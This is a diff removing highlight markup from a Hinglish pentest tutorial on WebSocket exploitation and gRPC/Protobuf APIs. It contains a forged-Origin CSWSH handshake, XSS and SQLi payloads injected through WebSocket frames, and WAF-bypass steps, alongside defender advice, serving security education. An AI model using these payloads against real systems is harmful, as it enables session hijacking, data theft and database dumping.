@@ -11692,2139 +11692,2139 @@ Normal HTTP `(web protocol)` ek **Walkie-Talkie** jaisa hai — ek baar mein ek 
 *(Attacker HTTP Handshake request intercept karta hai aur Origin change karta hai)*
 
 ```http
-# [[HL::Burp Suite | HTTP/1.1 | Handshake Request::HL]]
-[[HL::1  GET /chat HTTP/1.1                # GET method se chat endpoint call kiya::HL]]
+# Burp Suite | HTTP/1.1 | Handshake Request
+1  GET /chat HTTP/1.1                # GET method se chat endpoint call kiya
 
-[[HL::2  Host: target-chat.com             # Target server ka domain::HL]]
-[[HL::3  Upgrade: websocket                # Server ko bata raha hai ki connection HTTP se WebSocket pe upgrade karo::HL]]
-[[HL::4  Connection: Upgrade               # Upgrade confirm karne ka header::HL]]
-[[HL::5  Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ== # Base64 encoded nonce (security key handshake ke liye)::HL]]
-[[HL::6  Sec-WebSocket-Version: 13         # WebSocket protocol ka version::HL]]
-[[HL::7  Origin: https://evil-attacker.com # ATTACK: Origin header attacker ke domain pe set kiya (agar server isse accept kare toh CSWSH possible hai)::HL]]
+2  Host: target-chat.com             # Target server ka domain
+3  Upgrade: websocket                # Server ko bata raha hai ki connection HTTP se WebSocket pe upgrade karo
+4  Connection: Upgrade               # Upgrade confirm karne ka header
+5  Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ== # Base64 encoded nonce (security key handshake ke liye)
+6  Sec-WebSocket-Version: 13         # WebSocket protocol ka version
+7  Origin: https://evil-attacker.com # ATTACK: Origin header attacker ke domain pe set kiya (agar server isse accept kare toh CSWSH possible hai)
 
-[[HL::```::HL]]
+```
 
-[[HL::```::HL]]
-[[HL::# 📤 Expected Output (Server responds with 101):::HL]]
-[[HL::HTTP/1.1 101 Switching Protocols::HL]]
-[[HL::Upgrade: websocket::HL]]
-[[HL::Connection: Upgrade::HL]]
-[[HL::Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=::HL]]
+```
+# 📤 Expected Output (Server responds with 101):
+HTTP/1.1 101 Switching Protocols
+Upgrade: websocket
+Connection: Upgrade
+Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
 
-[[HL::```::HL]]
+```
 
-[[HL::#### 2. WebSocket Frame Injection (XSS & SQLi via WebSocket)::HL]]
+#### 2. WebSocket Frame Injection (XSS & SQLi via WebSocket)
 
-[[HL::*(Ab connection establish ho gaya hai, WAF bypass ho chuka hai. Attacker Burp Repeater (WebSocket tab) se direct payload bhejta hai)*::HL]]
+*(Ab connection establish ho gaya hai, WAF bypass ho chuka hai. Attacker Burp Repeater (WebSocket tab) se direct payload bhejta hai)*
 
-[[HL::```json::HL]]
-# [[HL::Burp Suite Repeater (WebSocket Connection Active)::HL]]
-[[HL::1  {::HL]]
-[[HL::2    "message_type": "chat",         # JSON frame WSS pe ja raha hai (chat application ka format)::HL]]
+```json
+# Burp Suite Repeater (WebSocket Connection Active)
+1  {
+2    "message_type": "chat",         # JSON frame WSS pe ja raha hai (chat application ka format)
 
-[[HL::3    "user": "attacker",             # Attacker ka username::HL]]
-[[HL::4    "content": "<img src=x onerror=alert(1)>" # ATTACK: XSS payload injection::HL]]
-[[HL::5  }::HL]]
+3    "user": "attacker",             # Attacker ka username
+4    "content": "<img src=x onerror=alert(1)>" # ATTACK: XSS payload injection
+5  }
 
-[[HL::```::HL]]
+```
 
-[[HL::```::HL]]
-[[HL::# 📤 Expected Output (Broadcasted to all users, triggering XSS on their browsers):::HL]]
-[[HL::{"message_type": "chat", "user": "attacker", "content": "<img src=x onerror=alert(1)>"}::HL]]
+```
+# 📤 Expected Output (Broadcasted to all users, triggering XSS on their browsers):
+{"message_type": "chat", "user": "attacker", "content": "<img src=x onerror=alert(1)>"}
 
-[[HL::```::HL]]
+```
 
-[[HL::```json::HL]]
-[[HL::# SQLi payload injection in the same frame format::HL]]
-[[HL::1  {::HL]]
-[[HL::2    "message_type": "fetch_history",# Backend DB query trigger karne wala function::HL]]
-[[HL::3    "room_id": "1' OR 1=1--"        # ATTACK: SQLi payload to dump all rooms::HL]]
-[[HL::4  }::HL]]
+```json
+# SQLi payload injection in the same frame format
+1  {
+2    "message_type": "fetch_history",# Backend DB query trigger karne wala function
+3    "room_id": "1' OR 1=1--"        # ATTACK: SQLi payload to dump all rooms
+4  }
 
-[[HL::```::HL]]
+```
 
-[[HL::```::HL]]
-[[HL::# 📤 Expected Output (Database dumps all data):::HL]]
-[[HL::{"status": "success", "history": [{"room": 1, "data": "..."}, {"room": 2, "data": "..."}]}::HL]]
+```
+# 📤 Expected Output (Database dumps all data):
+{"status": "success", "history": [{"room": 1, "data": "..."}, {"room": 2, "data": "..."}]}
 
-[[HL::```::HL]]
+```
 
-[[HL::### 🔒 8. Attack Surface & Defense (Dual Perspective)::HL]]
+### 🔒 8. Attack Surface & Defense (Dual Perspective)
 
-[[HL::**🔴 Attacker Perspective:**::HL]]
+**🔴 Attacker Perspective:**
 
-[[HL::* Attacker `Origin` header tamper karke session hijack (CSWSH) karta hai.::HL]]
-[[HL::* WAF HTTP layer pe baitha hota hai. Attacker handshake pass kar leta hai, phir frames ke andar SQLi/XSS bhejkar backend pwn karta hai.::HL]]
+* Attacker `Origin` header tamper karke session hijack (CSWSH) karta hai.
+* WAF HTTP layer pe baitha hota hai. Attacker handshake pass kar leta hai, phir frames ke andar SQLi/XSS bhejkar backend pwn karta hai.
 
-[[HL::**🔵 Defender Perspective:**::HL]]
+**🔵 Defender Perspective:**
 
-[[HL::* Handshake ke waqt `Origin` header strictly validate karo whitelist ke against.::HL]]
-[[HL::* WebSocket establish hone ke baad authentication sessions validate karo — unauthenticated streams allow mat karo.::HL]]
-[[HL::* Frames ke andar aane wale payloads ko bhi sanitize/encode karo (WAFs ko WebSocket support ke liye configure karo).::HL]]
+* Handshake ke waqt `Origin` header strictly validate karo whitelist ke against.
+* WebSocket establish hone ke baad authentication sessions validate karo — unauthenticated streams allow mat karo.
+* Frames ke andar aane wale payloads ko bhi sanitize/encode karo (WAFs ko WebSocket support ke liye configure karo).
 
-[[HL::### 🌍 9. Real-World Penetration Testing Use-Case::HL]]
+### 🌍 9. Real-World Penetration Testing Use-Case
 
-[[HL::Bug bounty (HackerOne) mein ek famous chat application ka real-time ticker tha jahan CSWSH vulnerability thi. Attacker ne ek malicious HTML page banaya. Jab victim ne us page ko visit kiya, page ne victim ke browser se silently chat app pe ek `wss://` connection khola (victim ke cookies ke saath) aur uska private chat history attacker ke server pe forward kar diya. WAF fail ho gaya kyunki attack continuous real-time channel se hua.::HL]]
+Bug bounty (HackerOne) mein ek famous chat application ka real-time ticker tha jahan CSWSH vulnerability thi. Attacker ne ek malicious HTML page banaya. Jab victim ne us page ko visit kiya, page ne victim ke browser se silently chat app pe ek `wss://` connection khola (victim ke cookies ke saath) aur uska private chat history attacker ke server pe forward kar diya. WAF fail ho gaya kyunki attack continuous real-time channel se hua.
 
-[[HL::### ⚠️ 10. Pentest Anti-Patterns & Common Mistakes (Beginner Traps)::HL]]
+### ⚠️ 10. Pentest Anti-Patterns & Common Mistakes (Beginner Traps)
 
-* **❌ [[HL::Mistake:** Sirf HTTP history check karna aur WebSockets tab ignore karna.::HL]]
-* [[HL::**🤦 Why:** Beginners ko lagta hai ki saari API calls `POST /api/v1/...` aayengi.::HL]]
-* [[HL::**✅ The 'Pro' Way:** Hamesha Burp mein "WebSockets History" tab monitor karo, especially chat ya live dashboards pe.::HL]]
-* [[HL::**⚡ Consequences:** Tum target ki sabse vulnerable, uninspected attack surface (real-time API) completely miss kar doge.::HL]]
+* **❌ Mistake:** Sirf HTTP history check karna aur WebSockets tab ignore karna.
+* **🤦 Why:** Beginners ko lagta hai ki saari API calls `POST /api/v1/...` aayengi.
+* **✅ The 'Pro' Way:** Hamesha Burp mein "WebSockets History" tab monitor karo, especially chat ya live dashboards pe.
+* **⚡ Consequences:** Tum target ki sabse vulnerable, uninspected attack surface (real-time API) completely miss kar doge.
 
-[[HL::### 🤔 11. Agar Dimag Ghoom Raha Hai? (Confusion Clarifier)::HL]]
+### 🤔 11. Agar Dimag Ghoom Raha Hai? (Confusion Clarifier)
 
-* [[HL::**Confusion 1 — "Kya wss:// HTTPS se alag hai?"**::HL]]
-[[HL::* **Galat soch:** Dono same chiz hain.::HL]]
-* [[HL::**Actually:** `ws://` (WebSocket) unencrypted hai jaise `http://`, aur `wss://` (WebSocket Secure) encrypted (TLS) hai jaise `https://`. Par WebSockets HTTP ke upar sirf handshake karte hain, fir binary stream ban jate hain.::HL]]
-* [[HL::**Prove karo:** Wireshark chalao. Tum dekhoge HTTP request 101 pe ruk jati hai, uske baad alag "WebSocket" protocol ke packets dikhte hain.::HL]]
+* **Confusion 1 — "Kya wss:// HTTPS se alag hai?"**
+* **Galat soch:** Dono same chiz hain.
+* **Actually:** `ws://` (WebSocket) unencrypted hai jaise `http://`, aur `wss://` (WebSocket Secure) encrypted (TLS) hai jaise `https://`. Par WebSockets HTTP ke upar sirf handshake karte hain, fir binary stream ban jate hain.
+* **Prove karo:** Wireshark chalao. Tum dekhoge HTTP request 101 pe ruk jati hai, uske baad alag "WebSocket" protocol ke packets dikhte hain.
 
 
-[[HL::* **Confusion 2 — "CSWSH aur CSRF mein kya difference hai?"**::HL]]
-[[HL::* **Galat soch:** Dono bas alag naam hain same attack ke.::HL]]
-[[HL::* **Actually:** CSRF ek 1-way attack hai (bas action trigger hota hai, attacker result nahi padh sakta). CSWSH ek 2-way session hijack hai (attacker bidirectional connection banata hai aur target ka real-time data padh/likh dono sakta hai).::HL]]
-[[HL::* **Prove karo:** CSWSH ka payload JavaScript `new WebSocket('wss://target.com')` use karta hai jo victim ke cookies ke saath auth ho jata hai.::HL]]
+* **Confusion 2 — "CSWSH aur CSRF mein kya difference hai?"**
+* **Galat soch:** Dono bas alag naam hain same attack ke.
+* **Actually:** CSRF ek 1-way attack hai (bas action trigger hota hai, attacker result nahi padh sakta). CSWSH ek 2-way session hijack hai (attacker bidirectional connection banata hai aur target ka real-time data padh/likh dono sakta hai).
+* **Prove karo:** CSWSH ka payload JavaScript `new WebSocket('wss://target.com')` use karta hai jo victim ke cookies ke saath auth ho jata hai.
 
 
-* [[HL::**Confusion 3 — "Kya WAFs WebSockets ko inspect nahi kar sakte?"**::HL]]
-[[HL::* **Galat soch:** Agar WAF laga hai toh XSS/SQLi block ho jayega.::HL]]
-* [[HL::**Actually:** "WebSockets HTTP nahi hain." Traditional WAFs HTTP request body (JSON/URL-encoded) ko parse karte hain. Ek baar connection upgrade (101) ho gaya, frames unke liye black-box type ban jate hain jab tak WAF explicitly WebSocket parsing ke liye configure na ho (jo mostly nahi hota).::HL]]
-* [[HL::**Prove karo:** Payload ko normal POST request mein bhejo (block hoga) vs WebSocket frame mein bhejo (execute hoga).::HL]]
+* **Confusion 3 — "Kya WAFs WebSockets ko inspect nahi kar sakte?"**
+* **Galat soch:** Agar WAF laga hai toh XSS/SQLi block ho jayega.
+* **Actually:** "WebSockets HTTP nahi hain." Traditional WAFs HTTP request body (JSON/URL-encoded) ko parse karte hain. Ek baar connection upgrade (101) ho gaya, frames unke liye black-box type ban jate hain jab tak WAF explicitly WebSocket parsing ke liye configure na ho (jo mostly nahi hota).
+* **Prove karo:** Payload ko normal POST request mein bhejo (block hoga) vs WebSocket frame mein bhejo (execute hoga).
 
 
 
-[[HL::### 🛠️ 12. Troubleshooting Flowchart (Tool/Exploit Issues)::HL]]
+### 🛠️ 12. Troubleshooting Flowchart (Tool/Exploit Issues)
 
-[[HL::* **`[Burp Repeater WebSocket tab is greyed out/disabled]`**::HL]]
-[[HL::* **Root Cause:** Tumne connection live nahi rakha hai ya dead connection bhej diya.::HL]]
-[[HL::* **Fix:** Browser se wapas live interaction karo aur ek taaza active WebSocket frame ko Repeater mein bhejo.::HL]]
+* **`[Burp Repeater WebSocket tab is greyed out/disabled]`**
+* **Root Cause:** Tumne connection live nahi rakha hai ya dead connection bhej diya.
+* **Fix:** Browser se wapas live interaction karo aur ek taaza active WebSocket frame ko Repeater mein bhejo.
 
 
-[[HL::* **`[Connection drops immediately after 101 Switching Protocols]`**::HL]]
-[[HL::* **Root Cause:** Server ne tumhara custom `Origin` header reject kar diya ya auth token frame expected tha.::HL]]
-[[HL::* **Fix:** Handshake request mein legitimate Origin bhejo, CSWSH possible nahi hai wahan.::HL]]
+* **`[Connection drops immediately after 101 Switching Protocols]`**
+* **Root Cause:** Server ne tumhara custom `Origin` header reject kar diya ya auth token frame expected tha.
+* **Fix:** Handshake request mein legitimate Origin bhejo, CSWSH possible nahi hai wahan.
 
 
-[[HL::* **`[Injected payload doesn't trigger anything]`**::HL]]
-[[HL::* **Root Cause:** Payload ka structure frame format se match nahi kar raha (e.g., server JSON expect kar raha hai, tum raw text bhej rahe ho).::HL]]
-[[HL::* **Fix:** Original client request ka data structure exactly copy karo aur value field ke andar payload dalo.::HL]]
+* **`[Injected payload doesn't trigger anything]`**
+* **Root Cause:** Payload ka structure frame format se match nahi kar raha (e.g., server JSON expect kar raha hai, tum raw text bhej rahe ho).
+* **Fix:** Original client request ka data structure exactly copy karo aur value field ke andar payload dalo.
 
 
 
-### ⚖️ 13. [[HL::Comparison (HTTP vs WebSockets)::HL]]
+### ⚖️ 13. Comparison (HTTP vs WebSockets)
 
-[[HL::| Feature | HTTP/REST APIs | WebSockets (WSS) APIs |::HL]]
+| Feature | HTTP/REST APIs | WebSockets (WSS) APIs |
 
-[[HL::| --- | --- | --- |::HL]]
-[[HL::| **Direction** | Unidirectional (Client requests, Server responds) | Bidirectional (Full-duplex communication) |::HL]]
+| --- | --- | --- |
+| **Direction** | Unidirectional (Client requests, Server responds) | Bidirectional (Full-duplex communication) |
 
-[[HL::| **Connection State** | Stateless (har request alag hai) | Persistent (ek lamba connection) |::HL]]
-[[HL::| **WAF Inspection** | Very strict (payloads easily detected) | Often bypassed (frames inspection is weak) |::HL]]
+| **Connection State** | Stateless (har request alag hai) | Persistent (ek lamba connection) |
+| **WAF Inspection** | Very strict (payloads easily detected) | Often bypassed (frames inspection is weak) |
 
-[[HL::### 🔄 14. Kill Chain & Attack Phase Flow::HL]]
+### 🔄 14. Kill Chain & Attack Phase Flow
 
-[[HL::```text::HL]]
-[[HL::⚔️ Attack Phase: Reconnaissance / Exploitation::HL]]
-[[HL::📍 Kill Chain Position: Initial Exploitation::HL]]
-[[HL::🔗 This connects to: XSS, SQLi, Session Hijacking::HL]]
-[[HL::🔄 Flow: ::HL]]
-[[HL::1. Burp "WebSockets History" mein traffic identify karo.::HL]]
-[[HL::2. Handshake intercept karke `Origin` manipulate karo (CSWSH Test).::HL]]
-[[HL::3. Active frame mein XSS/SQLi dalo (Frame Injection).::HL]]
-[[HL::4. WAF bypass karke backend DB/other clients ko exploit karo.::HL]]
+```text
+⚔️ Attack Phase: Reconnaissance / Exploitation
+📍 Kill Chain Position: Initial Exploitation
+🔗 This connects to: XSS, SQLi, Session Hijacking
+🔄 Flow: 
+1. Burp "WebSockets History" mein traffic identify karo.
+2. Handshake intercept karke `Origin` manipulate karo (CSWSH Test).
+3. Active frame mein XSS/SQLi dalo (Frame Injection).
+4. WAF bypass karke backend DB/other clients ko exploit karo.
 
-[[HL::```::HL]]
+```
 
-[[HL::### 🎨 15. Visual Diagram (ASCII Art — Frame Injection Flow)::HL]]
+### 🎨 15. Visual Diagram (ASCII Art — Frame Injection Flow)
 
-[[HL::```text::HL]]
-[[HL::[Attacker]                  [WAF]                   [Backend API]::HL]]
-[[HL::   |                          |                           |::HL]]
-[[HL::   |---- HTTP Upgrade ------->| (Checks HTTP Headers)     |::HL]]
-[[HL::   |                          |--------- Forwards ------->|::HL]]
-[[HL::   |<--- 101 Switching Protocol --------------------------|::HL]]
-[[HL::   |                          |                           |::HL]]
-[[HL::   |==== TCP SOCKET OPEN ==== | ==== TCP SOCKET OPEN ====>|::HL]]
-[[HL::   |                          |                           |::HL]]
-[[HL::   |---- Frame: <img src=x> ->| (WAF Ignores Frame)       |::HL]]
-[[HL::   |                          |-------- Payload Reaches ->| [XSS Triggered/Stored]::HL]]
+```text
+[Attacker]                  [WAF]                   [Backend API]
+   |                          |                           |
+   |---- HTTP Upgrade ------->| (Checks HTTP Headers)     |
+   |                          |--------- Forwards ------->|
+   |<--- 101 Switching Protocol --------------------------|
+   |                          |                           |
+   |==== TCP SOCKET OPEN ==== | ==== TCP SOCKET OPEN ====>|
+   |                          |                           |
+   |---- Frame: <img src=x> ->| (WAF Ignores Frame)       |
+   |                          |-------- Payload Reaches ->| [XSS Triggered/Stored]
 
-[[HL::```::HL]]
+```
 
-[[HL::### ❓ 16. Interview & Certification Exam Q&A::HL]]
+### ❓ 16. Interview & Certification Exam Q&A
 
-* [[HL::**Q: WebSockets ke liye WAF bypass kyun easy hota hai?**::HL]]
-[[HL::**A:** Kyunki WAFs primarily HTTP protocol (Method, Headers, Body) ko analyze karne ke liye bane hote hain. WebSockets handshake ke baad ek raw persistent TCP stream mein convert ho jate hain jisme data "frames" mein flow hota hai. Agar WAF explicit frame inspection ke liye tuned nahi hai, toh payload WAF se seedha nikal jata hai.::HL]]
-[[HL::* **Q: CSWSH perform karne ke liye sabse important header konsa hai aur kyun?**::HL]]
-[[HL::**A:** `Origin` header. Server ko isi se pata chalta hai ki WebSocket connection attempt kis website se ho raha hai. Agar server `Origin` validate nahi karta, toh attacker kisi bhi random domain se WebSocket initiate karke victim ka session hijack kar sakta hai (using victim's cookies automatically sent by browser).::HL]]
-[[HL::* **Q: Burp Suite mein WebSockets test karte waqt agar connection disconnect ho jaye Repeater mein, tum kya karoge?**::HL]]
-[[HL::**A:** WebSocket connections time-sensitive aur persistent hote hain. Agar disconnect ho jaye, toh mujhe wapas browser proxy se ek naya live connection initiate karna hoga aur us naye active stream frame ko Repeater mein send karke intercept/inject karna hoga.::HL]]
-[[HL::* **Q: WebSockets connection initiate karne ke response code aur header kya hote hain?**::HL]]
-[[HL::**A:** HTTP Status Code `101 Switching Protocols` aur headers mein `Upgrade: websocket` aur `Connection: Upgrade` hota hai.::HL]]
-[[HL::* **Q: Kya CSRF token WebSocket authentication ke liye kaafi hai?**::HL]]
-[[HL::**A:** Handshake layer pe CSRF token help kar sakta hai, par secure approach yeh hai ki handshake hone ke baad *first message frame* mein explicit authentication token (jaise JWT) bheja jaye, taaki CSWSH completely mitigate ho sake.::HL]]
-[[HL::* **Q: Agar target sirf `ws://` use kar raha hai toh usme kya risk hai?**::HL]]
-[[HL::**A:** `ws://` completely unencrypted (plaintext) chalta hai. Local network pe agar koi ARP Spoofing ya packet sniffing (MITM) kar raha ho, toh wo saare live chat frames aur sensitive data intercept/modify kar sakta hai.::HL]]
-[[HL::* **Q: Ek application WebSocket payloads ko strict JSON parse karta hai. Tum wahan XSS kaise inject karoge?**::HL]]
-[[HL::**A:** Main JSON structure ko break nahi karunga. Main JSON object ke kisi *value* field ke andar XSS payload inject karunga (e.g., `{"message": "<script>alert(1)</script>"}`). Isse JSON parsing pass ho jayegi par jab browser us data ko DOM mein render karega, XSS execute ho jayega.::HL]]
+* **Q: WebSockets ke liye WAF bypass kyun easy hota hai?**
+**A:** Kyunki WAFs primarily HTTP protocol (Method, Headers, Body) ko analyze karne ke liye bane hote hain. WebSockets handshake ke baad ek raw persistent TCP stream mein convert ho jate hain jisme data "frames" mein flow hota hai. Agar WAF explicit frame inspection ke liye tuned nahi hai, toh payload WAF se seedha nikal jata hai.
+* **Q: CSWSH perform karne ke liye sabse important header konsa hai aur kyun?**
+**A:** `Origin` header. Server ko isi se pata chalta hai ki WebSocket connection attempt kis website se ho raha hai. Agar server `Origin` validate nahi karta, toh attacker kisi bhi random domain se WebSocket initiate karke victim ka session hijack kar sakta hai (using victim's cookies automatically sent by browser).
+* **Q: Burp Suite mein WebSockets test karte waqt agar connection disconnect ho jaye Repeater mein, tum kya karoge?**
+**A:** WebSocket connections time-sensitive aur persistent hote hain. Agar disconnect ho jaye, toh mujhe wapas browser proxy se ek naya live connection initiate karna hoga aur us naye active stream frame ko Repeater mein send karke intercept/inject karna hoga.
+* **Q: WebSockets connection initiate karne ke response code aur header kya hote hain?**
+**A:** HTTP Status Code `101 Switching Protocols` aur headers mein `Upgrade: websocket` aur `Connection: Upgrade` hota hai.
+* **Q: Kya CSRF token WebSocket authentication ke liye kaafi hai?**
+**A:** Handshake layer pe CSRF token help kar sakta hai, par secure approach yeh hai ki handshake hone ke baad *first message frame* mein explicit authentication token (jaise JWT) bheja jaye, taaki CSWSH completely mitigate ho sake.
+* **Q: Agar target sirf `ws://` use kar raha hai toh usme kya risk hai?**
+**A:** `ws://` completely unencrypted (plaintext) chalta hai. Local network pe agar koi ARP Spoofing ya packet sniffing (MITM) kar raha ho, toh wo saare live chat frames aur sensitive data intercept/modify kar sakta hai.
+* **Q: Ek application WebSocket payloads ko strict JSON parse karta hai. Tum wahan XSS kaise inject karoge?**
+**A:** Main JSON structure ko break nahi karunga. Main JSON object ke kisi *value* field ke andar XSS payload inject karunga (e.g., `{"message": "<script>alert(1)</script>"}`). Isse JSON parsing pass ho jayegi par jab browser us data ko DOM mein render karega, XSS execute ho jayega.
 
-[[HL::### 📝 17. One-Line Memory Hook::HL]]
+### 📝 17. One-Line Memory Hook
 
-[[HL::"WebSocket = 101 Call Connect! Origin test karo session hijack ke liye, Frame inject karo WAF bypass ke liye." (101 Switching Protocols, CSWSH, Frame Injection)::HL]]
+"WebSocket = 101 Call Connect! Origin test karo session hijack ke liye, Frame inject karo WAF bypass ke liye." (101 Switching Protocols, CSWSH, Frame Injection)
 
-[[HL::### 🔑 18. Keywords Coverage Verification::HL]]
+### 🔑 18. Keywords Coverage Verification
 
-[[HL::```text::HL]]
-[[HL::🔑 Keywords Coverage Check — WebSockets (WSS) API Exploitation::HL]]
-[[HL::✅ Covered   : WebSockets, wss://, ws://, full-duplex communication, bidirectional, HTTP Upgrade header, 101 Switching Protocols, Sec-WebSocket-Key, Cross-Site WebSocket Hijacking, CSWSH, CSRF equivalent, Origin header, WebSocket frames, payload injection, XSS via WebSocket, SQLi via WebSocket, Burp WebSocket History, unauthenticated streams, real-time API, chat application, ticker::HL]]
-[[HL::⚠️ Mentioned but needs more depth : (none)::HL]]
-[[HL::❌ MISSED    : (none)::HL]]
+```text
+🔑 Keywords Coverage Check — WebSockets (WSS) API Exploitation
+✅ Covered   : WebSockets, wss://, ws://, full-duplex communication, bidirectional, HTTP Upgrade header, 101 Switching Protocols, Sec-WebSocket-Key, Cross-Site WebSocket Hijacking, CSWSH, CSRF equivalent, Origin header, WebSocket frames, payload injection, XSS via WebSocket, SQLi via WebSocket, Burp WebSocket History, unauthenticated streams, real-time API, chat application, ticker
+⚠️ Mentioned but needs more depth : (none)
+❌ MISSED    : (none)
 
-[[HL::```::HL]]
+```
 
-[[HL::> ✅ Verified: 100% keyword coverage achieved for this topic.::HL]]
+> ✅ Verified: 100% keyword coverage achieved for this topic.
 
-[[HL::---::HL]]
+---
 
-[[HL::🛑 **PART 1 FINISHED. Type 'CONTINUE' for the next topic** ---::HL]]
-[[HL::✅ **Topics Covered in this message:** WebSockets (WSS) API Exploitation::HL]]
-[[HL::⏳ **Remaining Topics (in order):** gRPC & Protobuf APIs Exploitation::HL]]
-[[HL::📊 **Progress:** 1 topics done / 2 topics total::HL]]
+🛑 **PART 1 FINISHED. Type 'CONTINUE' for the next topic** ---
+✅ **Topics Covered in this message:** WebSockets (WSS) API Exploitation
+⏳ **Remaining Topics (in order):** gRPC & Protobuf APIs Exploitation
+📊 **Progress:** 1 topics done / 2 topics total
 
-[[HL::━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━::HL]]
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-[[HL::▶️ Resuming from: gRPC & Protobuf APIs Exploitation — Remaining after this: [None]::HL]]
+▶️ Resuming from: gRPC & Protobuf APIs Exploitation — Remaining after this: [None]
 
-[[HL::---::HL]]
+---
 
-[[HL::### 🎯 2. gRPC & Protobuf APIs Exploitation::HL]]
+### 🎯 2. gRPC & Protobuf APIs Exploitation
 
-[[HL::Is topic mein hum modern microservices APIs ko hack karna seekhenge jo REST (JSON) ki jagah **gRPC** aur **Protocol Buffers (Protobuf)** ka use karti hain. Hum dekhenge ki kaise unreadable binary payloads ko intercept karke readable banaya jata hai, aur phir unme IDOR/BOLA aur SQLi jaise standard attacks inject kiye jate hain.::HL]]
+Is topic mein hum modern microservices APIs ko hack karna seekhenge jo REST (JSON) ki jagah **gRPC** aur **Protocol Buffers (Protobuf)** ka use karti hain. Hum dekhenge ki kaise unreadable binary payloads ko intercept karke readable banaya jata hai, aur phir unme IDOR/BOLA aur SQLi jaise standard attacks inject kiye jate hain.
 
-[[HL::### 🐣 2. Simple Analogy (Hinglish)::HL]]
+### 🐣 2. Simple Analogy (Hinglish)
 
-REST API (JSON) ek open Postcard ki tarah hai — beech mein postman (proxy/Burp) aasaani se padh sakta hai aur badal sakta hai. **gRPC/Protobuf** ek **Shorthand Secret Letter** jaisa hai — sender apne message ko ek compact, unreadable form (binary) mein compress kar deta hai. Agar tumhare paas decoder book (`.[[HL::proto` file ya Burp extension) nahi hai, toh tumhe sirf gibberish (kachra) dikhega. Par agar tum us letter ko wapas normal language mein decode kar lo, toh tum usme apna jhootha message daal kar wapas shorthand mein pack kar sakte ho!::HL]]
+REST API (JSON) ek open Postcard ki tarah hai — beech mein postman (proxy/Burp) aasaani se padh sakta hai aur badal sakta hai. **gRPC/Protobuf** ek **Shorthand Secret Letter** jaisa hai — sender apne message ko ek compact, unreadable form (binary) mein compress kar deta hai. Agar tumhare paas decoder book (`.proto` file ya Burp extension) nahi hai, toh tumhe sirf gibberish (kachra) dikhega. Par agar tum us letter ko wapas normal language mein decode kar lo, toh tum usme apna jhootha message daal kar wapas shorthand mein pack kar sakte ho!
 
-### [[HL::📖 3. Technical Definition::HL]]
+### 📖 3. Technical Definition
 
-* [[HL::**Precise English:** gRPC (Google Remote Procedure Call) is a modern, high-performance RPC framework that uses HTTP/2 for transport and Protocol Buffers (Protobuf) for binary serialization. It converts structured data into a compact binary stream, making it highly efficient but unreadable to standard text-based HTTP proxies.::HL]]
-* [[HL::**Hinglish Simplification:** gRPC ek fast communication tarika hai jahan API ka data text (JSON) ki jagah chote binary chunks (Protobuf) mein convert hokar HTTP/2 ke upar travel karta hai.::HL]]
+* **Precise English:** gRPC (Google Remote Procedure Call) is a modern, high-performance RPC framework that uses HTTP/2 for transport and Protocol Buffers (Protobuf) for binary serialization. It converts structured data into a compact binary stream, making it highly efficient but unreadable to standard text-based HTTP proxies.
+* **Hinglish Simplification:** gRPC ek fast communication tarika hai jahan API ka data text (JSON) ki jagah chote binary chunks (Protobuf) mein convert hokar HTTP/2 ke upar travel karta hai.
 
-### [[HL::🧠 4. Why This Matters (Pentester/Red Teamer ke liye Zaroorat Kyun Hai?)::HL]]
+### 🧠 4. Why This Matters (Pentester/Red Teamer ke liye Zaroorat Kyun Hai?)
 
-* [[HL::**Problem:** Agar backend microservices ya mobile apps gRPC use kar rahe hain, toh unka traffic Burp Suite mein `application/grpc` content-type ke saath unreadable binary (gibberish) dikhega. Tum seedha payloads inject nahi kar paoge.::HL]]
-* [[HL::**Solution:** Binary serialization ko samajhna aur usko deserialize (decode) karke read/write format mein laana zaroori hai, taaki hidden vulnerabilities (BOLA/IDOR, SQLi) exploit ki ja sakein.::HL]]
-* [[HL::**What breaks if we don't know this?** Tum modern scalable apps ki poori API attack surface ko "encrypted" samajh ke skip kar doge, jabki wo sirf serialized hoti hai.::HL]]
-* [[HL::**✅ Kab use karo (Use in engagement when):** Jab Burp HTTP history mein `Content-Type: application/grpc` ya::HL]] `application/grpc-web` dikhe, aur body data human-readable na ho.
-* **❌ [[HL::Kab mat karo / Alternative::HL]] prefer karo:** Agar data already clear-text JSON ya XML mein aa raha hai, toh Protobuf tools ka koi use nahi hai.
+* **Problem:** Agar backend microservices ya mobile apps gRPC use kar rahe hain, toh unka traffic Burp Suite mein `application/grpc` content-type ke saath unreadable binary (gibberish) dikhega. Tum seedha payloads inject nahi kar paoge.
+* **Solution:** Binary serialization ko samajhna aur usko deserialize (decode) karke read/write format mein laana zaroori hai, taaki hidden vulnerabilities (BOLA/IDOR, SQLi) exploit ki ja sakein.
+* **What breaks if we don't know this?** Tum modern scalable apps ki poori API attack surface ko "encrypted" samajh ke skip kar doge, jabki wo sirf serialized hoti hai.
+* **✅ Kab use karo (Use in engagement when):** Jab Burp HTTP history mein `Content-Type: application/grpc` ya `application/grpc-web` dikhe, aur body data human-readable na ho.
+* **❌ Kab mat karo / Alternative prefer karo:** Agar data already clear-text JSON ya XML mein aa raha hai, toh Protobuf tools ka koi use nahi hai.
 
-[[HL::### 🔍 5. Visual / Terminal Mein Kya Dikhega::HL]]
+### 🔍 5. Visual / Terminal Mein Kya Dikhega
 
-[[HL::Bina tools ke, Burp Suite ka raw request body kuch aisi dikhegi:::HL]]
-[[HL::`...   user_profile  0123 ...` (Weird symbols aur unreadable bytes).::HL]]
-[[HL::Extension lagane ke baad, wahi body ek naye tab mein cleanly structured keys aur values ki tarah dikhegi, bilkul JSON jaisi, jisse tum edit kar sakoge.::HL]]
+Bina tools ke, Burp Suite ka raw request body kuch aisi dikhegi:
+`...   user_profile  0123 ...` (Weird symbols aur unreadable bytes).
+Extension lagane ke baad, wahi body ek naye tab mein cleanly structured keys aur values ki tarah dikhegi, bilkul JSON jaisi, jisse tum edit kar sakoge.
 
-[[HL::### ⚙️ 6. Under the Hood (Deep Dive — Attack/Defense Flow)::HL]]
+### ⚙️ 6. Under the Hood (Deep Dive — Attack/Defense Flow)
 
